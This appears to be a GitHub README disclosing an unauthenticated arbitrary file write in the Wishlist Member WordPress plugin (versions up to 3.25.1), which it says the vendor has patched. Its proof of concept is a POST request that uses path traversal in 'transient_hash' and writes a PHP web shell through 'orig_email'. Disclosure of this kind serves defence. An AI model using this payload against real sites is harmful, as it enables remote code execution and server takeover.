## 📄 Overview

This repository contains a detailed analysis of an **Unauthenticated Arbitrary File Write** vulnerability discovered in the **Wishlist Member** plugin for WordPress.

- **Affected Versions**: Version `3.25.1` and all earlier versions (i.e., `<= 3.25.1`)
- **Severity**: High – this issue could lead to **Remote Code Execution (RCE)** if exploited.

The vulnerability exists in the user registration endpoint and allows an attacker to write arbitrary files to the server by manipulating specific POST parameters.

This report is intended for educational and responsible disclosure purposes. Sensitive information has been redacted to prevent misuse.

---

## ⚙ Vulnerability Details

By sending a crafted `POST` request with parameters `transient_hash` and `orig_email`, an attacker can control both the file path and its contents.  

- **Potential Impact / RCE Risk**:  
  If the attacker is able to place the file in a web-accessible directory (such as the site root) and execute it, this could lead to **full Remote Code Execution (RCE)**, allowing the attacker to run arbitrary commands on the server.  

The issue has been confirmed on **Wishlist Member version 3.25.1**, and it is likely that earlier versions are also affected.

---

## 📸 Screenshots

![Screenshot](wishlist.png)

![Screenshot](wishlist2.png)

> Note: Sensitive paths and server-specific data have been redacted.

---

## 🧰 Proof of Concept (POC)

```http
POST /path/to/register HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

transient_hash=../path/to/file.php&orig_email=<?php system($_GET['cmd']); ?>
```

## Note
This vulnerability was discovered in Wishlist Member version 3.25.1 and earlier. 
It has been patched by the vendor in a later release. No CVE ID has been assigned to this issue as of now.
